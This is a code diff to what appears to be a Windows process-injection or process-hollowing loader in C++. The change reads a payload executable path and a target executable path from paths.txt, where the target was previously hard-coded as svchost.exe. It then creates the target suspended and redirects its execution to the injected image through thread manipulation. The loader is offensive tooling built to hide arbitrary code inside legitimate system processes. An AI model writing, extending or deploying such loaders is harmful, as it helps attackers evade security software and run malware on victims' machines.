@@ -1,11 +1,47 @@
 #include <iostream>
 #include <Windows.h>
+#include <fstream>
+#include <filesystem>
+#include <string>
 #include <strsafe.h>
 
 #include "hdr/shellcode.h"
 #include "hdr/funcs.h"
 
+
 int main() {
+    if (!std::filesystem::exists("paths.txt")) {
+        std::cerr << "paths.txt not found in directory\n";
+        std::cin.get();
+        return 1;
+    }
+
+    std::ifstream inputFile("paths.txt");
+    std::string filename;
+    std::string injectPath;
+
+    if (std::getline(inputFile, filename)) {
+        if (std::getline(inputFile, injectPath)) {
+            ;
+        }
+        else {
+            std::cerr << "Fix paths.txt\nLine 1: Path to PE to run\nLine 2: Path to PE to rewrite\n";
+            std::cin.get();
+            return 1;
+        }
+    }
+    else {
+        std::cerr << "Fix paths.txt\nLine 1: Path to PE to run\nLine 2: Path to PE to rewrite\n";
+        std::cin.get();
+        return 1;
+    }
+
+    inputFile.close();
+
+    // if you wish to hardcode the shellcode, remove both of these, the stuff above and head to hdr/shellcode.h
+    std::streamsize size;
+    unsigned char* shellcode = getPEbytes(filename, size);
+
     PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)shellcode;
     PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)(shellcode + DosHeader->e_lfanew);
 
@@ -24,7 +60,7 @@ int main() {
         return 1;
     }
 
-    if (!CreateProcess("C:\\Windows\\System32\\svchost.exe",
+    if (!CreateProcess(injectPath.c_str(),
         NULL, NULL, NULL, FALSE,
         CREATE_SUSPENDED,
         NULL, NULL, &si, &pi)) {
@@ -84,7 +120,6 @@ int main() {
 
     SuspendThread(pi.hThread);
     ResumeThread(NewThread);
-
 
     printPlus(); std::cout << "DosHeader: " << std::hex << "0x" << DosHeader;
     printPlus(); std::cout << "NtHeader: " << std::hex << "0x" << NtHeader;
